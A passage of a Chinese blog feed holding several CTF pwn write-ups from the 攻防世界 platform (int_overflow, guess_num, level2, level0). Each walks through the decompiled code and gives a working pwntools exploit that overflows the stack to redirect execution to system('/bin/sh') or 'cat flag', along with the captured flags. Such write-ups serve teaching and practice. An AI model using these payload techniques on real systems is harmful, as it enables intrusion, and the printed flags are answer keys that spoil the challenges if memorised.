    <content><![CDATA[<h1 id="【攻防世界】Pwn系列之int-overflow"><a href="#【攻防世界】Pwn系列之int-overflow" class="headerlink" title="【攻防世界】Pwn系列之int_overflow"></a>【攻防世界】Pwn系列之int_overflow</h1><p>该程序允许结果如下图所示</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bint_overflow/image-20231204110918046.png" class title="image-20231204110918046">

<p>使用ida反汇编获取其源代码，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;~~ Welcome to CTF! ~~&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       1.Login       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       2.Exit        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面就是一个if-else判断语句，输入1进入login()、输入2退出程序。我们继续跟踪login()观察代码逻辑，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">512</span>]; <span class="comment">// [esp+0h] [ebp-228h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+200h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入登陆页面后，从缓存区读入0x19u个字节的账号和0x199u个字节的密码，随后调用check_passwd()对输入的密码进行检查，我们继续跟进check_passwd()，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">11</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果输入的密码长度小于等于3且大于8则输出”invalid Password”，否则输出”Success”并将密码复制给dest。我们先来看strcpy这个函数栈中保存的数据，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-00000014 dest            db 11 dup(?)</span><br><span class="line">-00000009 var_9           db ?</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 s               dd ?                    ; offset</span><br></pre></td></tr></table></figure>

<p>解题思路肯定是使用rest覆盖r处，使返回地址覆盖为可以执行系统命令的函数地址即可。这里有个what_is_this()读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int what_is_this()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于该程序没有开启PIE，所以其静态地址是固定的，为<strong>0x804868B</strong></p>
<p>但是前面对密码长度进行了限制，我们分析下具体细节，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned __int8 v3; // [esp+Fh] [ebp-9h]</span><br><span class="line">v3 = strlen(s);</span><br><span class="line">if ( v3 &lt;= 3u || v3 &gt; 8u )</span><br></pre></td></tr></table></figure>

<p>v3是8位无符号整数型变量，而s在main()函数中为0x199u个字节，远大于v3的255位。所以这里存在整数型溢出，无论s为多大字节，最后v3都只保存后8位，这里就可以绕过if句判断，将字符串长度补充至(258,263]位。</p>
<p>最终整体的栈结构构造如下：</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bint_overflow/image-20231204125859656.png" class title="image-20231204125859656">

<p>编写代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">64899</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x0804868B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;passwd:&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x14</span> + <span class="number">0x4</span>) + p32(cat_flag_addr) + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">256</span>-<span class="number">0x14</span>-<span class="number">4</span>-<span class="number">4</span>+<span class="number">3</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bint_overflow/image-20231204130129522.png" class title="image-20231204130129522">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;dee51b69c2224dbf4814ac4f6f941d20&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-CTF -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Pwn系列之guess_num</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bguess_num/</url>
    <content><![CDATA[<h1 id="【攻防世界】Pwn系列之guess-num"><a href="#【攻防世界】Pwn系列之guess-num" class="headerlink" title="【攻防世界】Pwn系列之guess_num"></a>【攻防世界】Pwn系列之guess_num</h1><p>这个程序需要两个输入，意思让你输入一个数字</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bguess_num/image-20231127150925797.png" class title="image-20231127150925797">

<p>开启了NX和PIE保护，不能写入shellcode和覆盖地址指定程序自带系统命令</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bguess_num/image-20231127151036177.png" class title="image-20231127151036177">



<p>我们使用IDA反汇编打开该程序，查看其代码逻辑</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">  gets(v7);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用srand()随机生成数字然后进行处理得到v6，然后判断v6和输入的数字是否相等，经过10次循环的判断就能调用sub_C3E()函数使用系统命令system()查看flag。<strong>所以难点就是使得每次输入数字都为生成的随机数。</strong>这里提一下srand()函数，<strong>同一个rand函数</strong>使用同一个种子，<strong>同一个种子只会给同一个rand函数同一个值</strong>，所以多个rand（）函数使用同一个srand（）时所获得的值都不一样，即产生的随机数不同</p>
<p>想要使得每次生成的随机数都是固定的数字，需要将srand()的种子固定，我们来验证一下是否每次调用的随机数是否相同</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line">	srand(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		b = rand()%<span class="number">6</span>+<span class="number">1</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个程序不管允许多少次，固定的种子rand()函数生成的伪随机数序列都是固定的</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bguess_num/image-20231127154357485.png" class title="image-20231127154357485">





<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bguess_num/image-20231127155158790.png" class title="image-20231127155158790">

<p>这里的get()刚好可以覆盖掉seed的值将其设置为固定值，并且在linux上计算下伪随机数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//伪随机数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> b;</span><br><span class="line">	srand(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt;=<span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		b = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bguess_num/image-20231127155047447.png" class title="image-20231127155047447">

<p>得到伪随机数序列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2542625142</span><br></pre></td></tr></table></figure>

<p>pwn代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;61.147.171.105&quot;,60621)</span><br><span class="line">payload = b&#x27;a&#x27; * 0x20 + p64(0)</span><br><span class="line">p.sendlineafter(&quot;Your name:&quot;,payload)</span><br><span class="line">rand = [&#x27;2&#x27;,&#x27;5&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;6&#x27;,&#x27;2&#x27;,&#x27;5&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;]</span><br><span class="line">for i in range(10):</span><br><span class="line">        p.sendlineafter(&quot;Please input your guess number:&quot;,rand[i])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bguess_num/image-20231127155957931.png" class title="image-20231127155957931">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;fb2c0c1ddcc86ade3e2fa294e530bc1a&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-CTF -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Pwn系列之level2</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel2/</url>
    <content><![CDATA[<h1 id="【攻防世界】Pwn系列之level2"><a href="#【攻防世界】Pwn系列之level2" class="headerlink" title="【攻防世界】Pwn系列之level2"></a>【攻防世界】Pwn系列之level2</h1><p>反汇编程序后获得其源码，main()函数代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">nt __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其首先调用了vulnerable_function()函数，我们继续跟进该函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf在堆栈中的内存分配情况如下,s为rbp寄存器，r为rip寄存器标识CPU执行下一个指令的地址</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel2/image-20231117121122238.png" class title="image-20231117121122238">

<p>为buf数组分配了一个0x88h的栈空间，然后调用system()输出字符串，接着调用read()函数读取0x100u的数据到buf中。由此可以判断出和前面的内存溢出很相似，还是将rip指令寄存器地址覆盖为system()函数的地址，使其打开bash进程执行系统命令。</p>
<p>由于开启了NX执行保护，所以需要用到ROP技巧来执行system函数。</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel2/image-20231117123253423.png" class title="image-20231117123253423">





<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel2/image-20231117122001782.png" class title="image-20231117122001782">





<p>exp代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">53914</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(system_addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">host.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>,payload)</span><br><span class="line">host.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel2/image-20231117113009150.png" class title="image-20231117113009150">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-CTF -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Pwn系列之level0</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel0/</url>
    <content><![CDATA[<h1 id="【攻防世界】Pwn系列之level0"><a href="#【攻防世界】Pwn系列之level0" class="headerlink" title="【攻防世界】Pwn系列之level0"></a>【攻防世界】Pwn系列之level0</h1><p>该程序运行后显示”Hello, World”字符串，不能输入，应当和前面的也是对内存溢出分析</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel0/image-20231115101631286.png" class title="image-20231115101631286">

<p>使用IDA反汇编打开该程序，main()入口定位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C6 main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:00000000004005C6</span><br><span class="line">.text:00000000004005C6 var_10          = qword ptr -10h</span><br><span class="line">.text:00000000004005C6 var_4           = dword ptr -4</span><br><span class="line">.text:00000000004005C6</span><br><span class="line">.text:00000000004005C6 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C6                 push    rbp</span><br><span class="line">.text:00000000004005C7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004005CA                 sub     rsp, 10h</span><br><span class="line">.text:00000000004005CE                 mov     [rbp+var_4], edi</span><br><span class="line">.text:00000000004005D1                 mov     [rbp+var_10], rsi</span><br><span class="line">.text:00000000004005D5                 mov     edx, 0Dh        ; n</span><br><span class="line">.text:00000000004005DA                 mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;</span><br><span class="line">.text:00000000004005DF                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004005E4                 call    _write   ;输出字符串</span><br><span class="line">.text:00000000004005E9                 mov     eax, 0</span><br><span class="line">.text:00000000004005EE                 call    vulnerable_function</span><br><span class="line">.text:00000000004005F3                 leave</span><br><span class="line">.text:00000000004005F4                 retn</span><br><span class="line">.text:00000000004005F4 ; &#125; // starts at 4005C6</span><br><span class="line">.text:00000000004005F4 main            endp</span><br></pre></td></tr></table></figure>

<p>上面关键指令为调用vulnerable_function，我们继续跟进vulnerable_function函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用read()函数从buf中读取0x200u数据，就是512字节，而buf长度为128字节，这里存在栈溢出问题。我们来看栈中，buf数组为128字节，s为ebp保存8个字节，r为返回地址保存8个字节。</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel0/image-20231115110329423.png" class title="image-20231115110329423">

<p>堆栈图如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel0/image-20231115110957752.png" class title="image-20231115110957752">





<p>先从代码层面只能分析到此，我们来观察看看程序中存在的字符串列表，有system和&#x2F;bin&#x2F;sh可以判断出执行了bash开启shell进程</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel0/image-20231115104244896.png" class title="image-20231115104244896">

<p>点击进入其函数体，callsystem()调用bash进程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上面的分析，只要将堆栈中的r返回地址覆盖为callsystem()地址就能执行shell程序执行命令</p>
<p>逆向代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="string">&#x27;62703&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(<span class="number">0x400596</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel0/image-20231115112151518.png" class title="image-20231115112151518">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;4eb843dc156e5f9e6616aa39217799eb&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-CTF -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Pwn系列之hello_pwn</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bhello_pwn/</url>
